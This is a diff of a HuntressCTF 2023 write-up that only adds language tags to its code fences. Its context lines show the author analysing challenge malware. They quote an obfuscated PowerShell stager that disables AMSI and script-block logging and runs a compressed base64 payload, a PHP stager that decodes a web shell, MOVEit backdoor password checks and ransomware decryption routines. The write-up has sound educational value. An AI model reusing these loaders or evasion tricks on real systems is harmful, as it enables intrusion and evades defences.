@@ -42,7 +42,7 @@ Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 ## F12
 During this challenge we are presented with a website that has a button with the text "Capture The Flag" and, when clicked, opens a popup for a split second. The actual code behind the button is:
 
-```
+```xml
 <script type="text/javascript">
     function ctf() {
         window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');
@@ -210,7 +210,7 @@ in_oven eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzI3LzIwMjMsIDAxOjU1
 
 This decoded to:
 
-```
+```json
 {"recipe": "Magic Cookies", "time": "10/27/2023, 01:55:07"}
 ```
 
@@ -225,7 +225,7 @@ This was a challenge that had to do with DTMF tones that phones use. I found an 
 
 Then I converted this large number back to bytes using a Python interpreter:
 
-```
+```python
 >>> bigint = 13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
 >>> bytearray.fromhex('{:0192x}'.format(bigint))
 bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00flag{6c733ef09bc4f2a4313ff63087e25d67}')
@@ -373,7 +373,7 @@ At this point I assumed that to get the flag it was necessary to authorize ourse
 
 Looking at the files, I noticed most of them were created on `5/10/2023`, but there was a directory of PowerShell scripts that was created on `9/19/2023`. I started to look for any credentials that may have been included in these scripts and found this in the file `nt6-health.ps1`:
 
-```
+```powershell
 $OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
 ```
 
@@ -445,7 +445,7 @@ python oletools\olevba.py ..\tragedy_redux\vbaProject.bin
 
 Which produced the following output:
 
-```
+```vb
 Function Pears(Beets)
     Pears = Chr(Beets - 17)
 End Function
@@ -495,7 +495,7 @@ End Sub
 
 I wanted this in something that I can actually interpret and play around with (I am clueless when it comes to VBA) so I converted it to Python and printed some of the more interesting variables I wanted to track: 
 
-```
+```python
 def pears(beets):
     return chr(int(beets) - 17)
 
@@ -540,7 +540,7 @@ $flag="flag{63dcc82c30197768f4d458da12f618bc}"
 ## Texas Chainsaw Massacre Tokyo Drift
 In this challenge, we are presented with an event log and told that a "rogue process" was detected on the endpoint when the user attempted to install a video game called "Texas Chainsaw Massacre." Scrolling through the event log I saw this interesting potentially related event:
 
-```
+```xml
 - <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
 - <System>
   <Provider Name="MsiInstaller" /> 
@@ -567,13 +567,13 @@ In this challenge, we are presented with an event log and told that a "rogue pro
 
 I've truncated the `<Binary>` XML element because it was rather large, but I threw it into CyberChef and got the following:
 
-```
+```powershell
 (('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
 ```
 
 This looks like obfuscated powershell based on the presence of some noticable strings such as `CoMSpEc`, `vERboSEpreFeRenCe`, or `[rEGeX]::mAtcheS`. I used a tool called [PowerDecode](https://github.com/Malandrone/PowerDecode) to attempt to deobfuscate it and got the following script:
 
-```
+```powershell
 try {
     $TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue'; 
     if ($error.Count -eq 0) { 
@@ -615,14 +615,14 @@ Start-Process "https://youtu.be/561nnd9Ebss?t=16"
 ## HumanTwo
 This was a large collection of `human2.aspx` backdoors from the MOVEIt incident. I ran a diff on a few of them and the only lines that differed were in the `Page_load()` function on line 36. For example:
 
-```
+```php
 if (!String.Equals(pass, "24068cbf-de5f-4cd2-9ad6-ba7cdb7bbfa9"))
 if (!String.Equals(pass, "3b321587-d075-4221-9628-b6c8959841df"))
 ```
 
 So I dumped all of these lines and found one that was far different from the rest: 
 
-```
+```php
 if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000"))
 ```
 
@@ -688,7 +688,7 @@ Fortunately, the same key is used for every encrypted file, otherwise this would
 ## PHP Stager
 This challenge was a PHP script that contained a large encoded string variable. To solve it I simply ran it step by step, printing every intermediate variable as I went. For instance, the script contains the following obfuscated code:
 
-```
+```php
 $k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
 ```
 
@@ -700,25 +700,25 @@ create_function
 
 This is used on the next line:
 
-```
+```php
 $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
 ```
 
 Printing some more variables:
 
-```
+```php
 $fsPwhnfn8423 = base64_decode
 ```
 
 The end of the script becomes:
 
-```
+```php
 $c = create_function("/*XAjqgQvv4067*/", base64_decode( deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302")));
 ```
 
 If we get the value of `base64_decode( deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302"))`, it returns an embedded PHP script:
 
-```
+```php
 global $auth_pass,$color,$default_action,$default_use_ajax,$default_charset,$sort;
 global $cwd,$os,$safe_mode, $in;
 $auth_pass = 'edbc761d111e1b86fb47681d9f641468';
@@ -855,7 +855,7 @@ pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-
 
 I tried to delete all the files but was getting permission errors. After some thinking I decided to pull the files, delete their contents, and then re-upload them, effectively overwriting them. I wrote a simple PowerShell script to do this automatically:
 
-```
+```powershell
 $directoryPath = "C:\Temp"
 $fileList = Get-ChildItem -Path $directoryPath -Recurse -File
 
@@ -883,7 +883,7 @@ This challenge had to do with a binary that was communicating to a website that 
 
 I decided to do this one statically. I used Ghidra and the main function looked promising. I did some cleanup with renaming/retyping variables, and setting some equates:
 
-```
+```c
 undefined8 main(int param_1,long param_2)
 
 {
@@ -1017,7 +1017,7 @@ This challenge presented source code for a C# application. The program would bas
 
 I wrote an equivalent python script that would just decode the assembly data and print it in hex:
 
-```
+```python
 import base64
 
 def decode(t, k):
@@ -1056,13 +1056,13 @@ This challenge downloaded a UHA archive. I had to download a special program jus
 
 Once extracted, it presents a heavily obfuscated PowerShell program:
 
-```
+```powershell
 C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u'')); $plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a'')); if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sI''+''AIeJ''+''G2UC/+1X''+''bU/jOBD+3l9hrS''+''IlkU{0}''+''VFvb{1}IiFdWqD''+''bPRJKS8vR''+''brUKy''+''TR168TFcQplb//7''+''jfNSygJ73{1}lI94F''+''IVvwyMx4/M''+''7YfT9PYl5TH''+''hH7sku8VUnxd''+''T3gRMTT/ku''+''/fWUSjS3Mzp''+''oX7zCWHxBjby+UR''+''jzwaTw4OWq''+''kQ{1}M''+''u8XW2''+''DtJM{1}''+''omtGI''+''TFM8he5nIGAnbP''+''rOfiSf''+''Cfat2qb8W''+''uPFW{0}rlufP''+''gOzYcaD''+''GTrnvKbeq/''+''SWj0tC/ftXN8U5''+''9Uj2+ST2''+''WGHp/nUiIqgFjuk''+''l+mGrCi/USDN2''+''hvuAJn8rqJY''+''13G9VBn''+''HhTcNHa''+''ChyQMx4''+''kul''+''nZ{0}{1}a''+''AT{1}Wcr0kZyUUMHa''+''tdwX0''+''7CAQkiW6RsTI''+''/nkx+N8bF''+''3{0}00''+''ljS''+''CaieWIPiyD''+''2JFfUiq''+''n704YNC''+''D6QS1+l{0}Q''+''OJyYJoq''+''t+AIM{0}U4Zs8''+''i/MWO4c''+''Fsi91olY1sJpbpS''+''mBYG''+''9Jl1OjxIG''+''eSa+jOO''+''5kl''+''g4pcngl''+''n5UalMy7''+''yJvPq''+''3o6eZs2mX''+''3zgbAHTX6PK''+''{1}Zr''+''qHp''+''GYRBy''+''f2JBdrbGoXIgVz''+''sgGbaNGe/Yf''+''1SmP1UhP1V''+''u0U''+''e8ZDToP''+''JRn0r''+''7tr0pj38q{1}''+''ReTuIjmNI''+''YjtaxF1G/''+''zFPjuWjAl{1}{1}GR''+''7UUc9{1}9Qy8''+''GIDgCB''+''q{1}nFb4qKZ6oHU''+''dUbnSbKWUB''+''CNvHiCb''+''oFQbbfO''+''xMHjJD78QORAhd3''+''sYs''+''1aa4O6''+''CU{0}nb''+''{1}upxdtVFIbz{1}v''+''SSzSTXF7+hbpg8c''+''gsIgdJ7QYs''+''lPJs6r+4K6T''+''Mkl9{0}5Glu''+''Yn5{1}5zFtC''+''0eJ1KkPgYVIbj''+''o{0}8''+''GnHlOIWO''+''QzDaC57''+''tOwnF5/Fo+Wxx''+''juG7S0wnhgj8''+''Kh{0}1Wq''+''CPQ0Swuz2g''+''fZiZYMIpTJjosT5''+''oV4''+''OBS7I''+''8st{0}4RAf8HRc''+''hPkGa+Q''+''KSHZchP''+''D3WdcWmRIhcTDR6''+''GM2fVfnHhy''+''6uTOtAQ''+''UwTGyvTVur''+''qXKfi0+P''+''W8sVI4WAGVwCI''+''lQn''+''AgeNb0{1}ftv{0}Dxjj''+''Q6dlh+/lvbyX''+''9/K/{0}22X+XG''+''vHr''+''RZ0mnV635''+''0N7''+''+6d''+''Pmob8sR''+''bf{0}gc+/2j''+''O6vT''+''ufHt856786''+''dO6lz{1}e5i''+''e302D2/PjuxV''+''tzFMr''+''xqfFqP{0}3nQU3''+''c1G''+''9zXmzq+''+''YGzn4P8b''+''iM7f''+''Rwf85lk''+''4+Nh8w5''+''36Q1Z17P6vn7''+''WP8h1gW2R/n+0''+''m2g8UuZ''+''M{0}M3kN7UYyHh''+''T17M5+aw22''+''ch1+GvZO{0}oc3+bF''+''+FX2jz''+''PmifrIOWvTq''+''nNhse''+''D91Ba+iPwsPD''+''D2ZlPKCx3G1M1{1}W''+''+qwhS''+''RWP+p/''+''2tS+Al6''+''ud4''+''Ipl5DC8H5HTl''+''FX3C''+''xUnB1{0}qcKg3DU''+''{1}x/''+''ASIGhvQYCXR5sd''+''mMcV+RxJzSIUP''+''NeaOisYNO''+''5tVzNZNsBM0''+''H9lh2HRyM''+''0{1}u8{0}{0}O7rH''+''oKcShnVu1ut1ZD''+''7le7q+3htfj6''+''pbX4cm3ktix''+''FHjNwNtZZZt2s''+''0CkxjDfHC9''+''8H{1}unK{0}xB7C''+''Tyce''+''4H0AvlOfukrCJ''+''ucs20A''+''i5Vt8''+''u{1}R''+''fghcHVc/Vq+''+''D{0}FPQxA7''+''c{1}{1}0q/rzFxrX0''+''+uz6TZOnIC8z/AX''+''/mDwPfb8YfVVC1a''+''wcoCfd''+''jzseiN/bIX''+''DpUYmCf''+''aRhDPKHwQtAFB''+''tmK8gqP{0}gbpsWn''+''Hspnq''+''dxx8''+''emlmODf2GZMc5''+''4PA''+''AA='')-f''L'',''E'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"]
 ```
 
 It may be hard to tell, but there is Base64 encoding in there, and it is piped into:
 
-```
+```powershell
 &([scriptblock]::create(
     (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream(
         (New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((( ...
@@ -1091,7 +1091,7 @@ flag{dbfe5f755a898ce5f2088b0892850bf7}
 ## Black Cat II
 I opened this one in `dnSpy v6.1.8 32-bit` to take a look at the source code. The program asks for a 64-bit key, and validates it, then calls `DecryptFiles(dir, key)`:
 
-```
+```c#
 private void button1_Click(object sender, EventArgs e)
 		{
 			try
@@ -1122,7 +1122,7 @@ private void button1_Click(object sender, EventArgs e)
 
 The file decryption routine is as follows:
 
-```
+```c#
 public static void DecryptFiles(string directoryPath, string decryptionKey)
 		{
 			string[] files = Directory.GetFiles(directoryPath, "*.encry");
@@ -1166,7 +1166,7 @@ The value of this hardcoded IV (found at the bottom of the script) is:
 
 The important parts of the `AESDecryptFile` are as follows:
 
-```
+```c#
 byte[] key2 = DecryptorUtil.GenerateAesKeyFromPassword(key);
 aes.Key = key2;
 aes.IV = iv;
@@ -1176,7 +1176,7 @@ aes.Padding = PaddingMode.Zeros;
 
 This indicates that the encryption algorithm is `AES-CFB`, is using a hardcoded IV which is the same for all files, and is zero-padded. The `GenerateAesKeyFromPassword` function is as follows:
 
-```
+```c#
 private static byte[] GenerateAesKeyFromPassword(string password)
 		{
 			byte[] bytes = Encoding.UTF8.GetBytes("KnownSaltValue");
@@ -1198,7 +1198,7 @@ This indicates the key is derived by the `PBKDF2-SHA256` algorithm with a known 
 
 But what about `CalculateSHA256Hash`? Remember, for every file except for the first, this function is run with the previous filename as a parameter. The code is as follows:
 
-```
+```c#
 private static string CalculateSHA256Hash(string filePath)
 		{
 			string result;
@@ -1348,7 +1348,7 @@ C64File
 ## Welcome to the Park
 This was a MacOS app directory. There was a hidden Mach-O file inside, which contained the following XML (it was Base64 encoded):
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -1483,7 +1483,7 @@ This challenge presents two files, the `ntds.dit` and the `SYSTEM` registry hive
 
 The first step is to extract these hashes, I used a tool called `DSInternals`:
 
-```
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Install-Module -Name DSInternals
 $key = Get-BootKey -SystemHiveFilePath 'C:\temp\SYSTEM'
